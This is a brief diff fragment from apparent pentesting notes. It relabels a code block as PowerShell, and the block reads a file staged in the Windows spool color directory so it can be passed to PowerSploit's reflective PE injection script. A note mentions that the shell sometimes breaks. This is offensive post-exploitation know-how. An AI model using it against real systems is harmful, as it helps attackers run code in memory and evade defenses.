@@ -20,7 +20,7 @@ C:\windows\System32\spool\drivers\color
 
 NOTE: sometimes, have noticed this breaks the shell, other times it works.
 
-```bash
+```powershell
 # located at /usr/share/windows-resources/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1 .
 
 $ByteArray = [System.IO.File]::ReadAllBytes("C:\windows\System32\spool\drivers\color\FILE");
